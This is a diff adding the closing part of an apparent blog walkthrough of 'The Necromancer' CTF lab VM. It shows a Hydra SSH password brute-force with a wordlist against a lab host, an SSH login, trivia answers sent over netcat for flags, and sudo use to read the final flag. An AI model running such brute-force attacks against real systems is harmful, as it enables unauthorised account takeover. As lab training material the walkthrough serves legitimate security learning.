@@ -972,6 +972,249 @@ iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
 
 <p>Flag 7, Yeah…</p>
 
+<p>9e5494108d10bbd5f9e7ae52239546c4 = demonslayer</p>
+
+<p>finaly ssh :)</p>
+
+<p>but no password so, hydra it’s your turn.</p>
+
+<pre>
+  <code class="bash">
+  hydra -t 4 -l demonslayer -P rockyou.txt 192.168.99.100 ssh
+Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-10-31 20:01:59
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
+[DATA] attacking ssh://192.168.99.100:22/
+[22][ssh] host: 192.168.99.100   login: demonslayer   password: 12345678
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-10-31 20:02:01
+
+  </code>
+</pre>
+
+<p>ok so now connect with everything we have.</p>
+
+<p>pre&gt;
+  <code class="bash">
+  ssh demonslayer@192.168.99.100
+demonslayer@192.168.99.100's password:</code></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>      .                                                      .
+    .n                   .                 .                  n.   .   .dP                  dP                   9b                 9b.    .  4    qXb         .       dX                     Xb       .        dXp     t dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb 9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP  9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP   `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+`9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+    ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+                    )b.  .dbo.dP'`v'`9b.odb.  .dX(
+                  ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+                 dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+                dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+                 `'      9XXXXXX(   )XXXXXXP      `'
+                          XXXX X.`v'.X XXXX
+                          XP^X'`b   d'`X^XX
+                          X. 9  `   '  P )X
+                          `b  `       '  d'
+                           `             '                       
+                           THE NECROMANCER!
+                             by  @xerubus
+</code></pre>
+</div>
+
+<p>$ whoami
+demonslayer
+$ ls
+flag8.txt
+$ cat flag8.txt                                                                                                      <br />
+You enter the Necromancer’s Lair!</p>
+
+<p>A stench of decay fills this place.</p>
+
+<p>Jars filled with parts of creatures litter the bookshelves.</p>
+
+<p>A fire with flames of green burns coldly in the distance.</p>
+
+<p>Standing in the middle of the room with his back to you is the Necromancer.</p>
+
+<p>In front of him lies a corpse, indistinguishable from any living creature you have seen before.</p>
+
+<p>He holds a staff in one hand, and the flickering object in the other.</p>
+
+<p>“You are a fool to follow me here!  Do you not know who I am!”</p>
+
+<p>The necromancer turns to face you.  Dark words fill the air!</p>
+
+<p>“You are damned already my friend.  Now prepare for your own death!”</p>
+
+<p>Defend yourself!  Counter attack the Necromancer’s spells at u777!</p>
+
+<p>&lt;/code&gt;
+&lt;/pre&gt;</p>
+
+<pre>
+  <code class="bash">
+  nc -u localhost 777
+
+
+
+** You only have 3 hitpoints left! **
+
+Defend yourself from the Necromancer's Spells!
+
+Where do the Black Robes practice magic of the Greater Path?  Kelewan
+
+
+flag8{55a6af2ca3fee9f2fef81d20743bda2c}
+
+
+
+** You only have 3 hitpoints left! **
+
+Defend yourself from the Necromancer's Spells!
+
+Who did Johann Faust VIII make a deal with?  mephistopheles
+
+
+flag9{713587e17e796209d1df4c9c2c2d2966}
+
+
+
+** You only have 3 hitpoints left! **
+
+Defend yourself from the Necromancer's Spells!
+
+Who is tricked into passing the Ninth Gate?  Hedge
+
+
+flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
+
+A great flash of light knocks you to the ground; momentarily blinding you!
+
+As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.
+
+An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.
+
+The room is silent.
+
+You walk over to where the Necromancer once stood.
+
+On the ground is a small vile.
+
+
+  </code>
+</pre>
+
+<p>hmm what now, what maybe changed…</p>
+
+<pre>
+  <code class="bash">
+  ls -la
+  total 44
+  drwxr-xr-x  3 demonslayer  demonslayer  512 Oct 30 01:11 .
+  drwxr-xr-x  3 root         wheel        512 May 11  2016 ..
+  -rw-r--r--  1 demonslayer  demonslayer   87 May 11  2016 .Xdefaults
+  -rw-r--r--  1 demonslayer  demonslayer  773 May 11  2016 .cshrc
+  -rw-r--r--  1 demonslayer  demonslayer  103 May 11  2016 .cvsrc
+  -rw-r--r--  1 demonslayer  demonslayer  359 May 11  2016 .login
+  -rw-r--r--  1 demonslayer  demonslayer  175 May 11  2016 .mailrc
+  -rw-r--r--  1 demonslayer  demonslayer  218 May 11  2016 .profile
+  -rw-r--r--  1 demonslayer  demonslayer  196 Oct 30 01:10 .smallvile
+  drwx------  2 demonslayer  demonslayer  512 May 11  2016 .ssh
+  -rw-r--r--  1 demonslayer  demonslayer  706 May 11  2016 flag8.txt
+  </code>
+</pre>
+
+<p>There is now a file called .smallvile</p>
+
+<pre>
+  <code class="bash">
+  cat .smallvile
+You pick up the small vile.
+
+Inside of it you can see a green liquid.
+
+Opening the vile releases a pleasant odour into the air.
+
+You drink the elixir and feel a great power within your veins!
+
+  </code>
+</pre>
+
+<p>Hmm is it maybe…</p>
+
+<pre>
+  <code class="bash">
+  cat .smallvile
+  sudo su — root
+  Password:
+  I can't hear you -- I'm using the scrambler.
+  Password:
+  No soap, honkie-lips.
+
+  </code>
+</pre>
+
+<p>maybe this helps…</p>
+
+<pre>
+  <code class="bash">
+  sudo -l
+Matching Defaults entries for demonslayer on thenecromancer:
+    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"
+
+User demonslayer may run the following commands on thenecromancer:
+    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
+
+
+    sudo cat /root/flag11.txt
+
+
+
+    Suddenly you feel dizzy and fall to the ground!
+
+    As you open your eyes you find yourself staring at a computer screen.
+
+    Congratulations!!! You have conquered......
+
+              .                                                      .
+            .n                   .                 .                  n.
+      .   .dP                  dP                   9b                 9b.    .
+     4    qXb         .       dX                     Xb       .        dXp     t
+    dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+    9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+     9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+      `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
+        `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
+            ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
+                            )b.  .dbo.dP'`v'`9b.odb.  .dX(
+                          ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+                         dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
+                        dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+                        9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
+                         `'      9XXXXXX(   )XXXXXXP      `'
+                                  XXXX X.`v'.X XXXX
+                                  XP^X'`b   d'`X^XX
+                                  X. 9  `   '  P )X
+                                  `b  `       '  d'
+                                   `             '                       
+                                   THE NECROMANCER!
+                                     by  @xerubus
+
+                       flag11{42c35828545b926e79a36493938ab1b1}
+
+
+    Big shout out to Dook and Bull for being test bunnies.
+
+    Cheers OJ for the obfuscation help.
+
+    Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.
+
+    "========================================="
+    "  xerubus (@xerubus) - www.mogozobo.com  "
+    "========================================="
+
+  </code>
+</pre>
+
     </section>
 
     <footer>
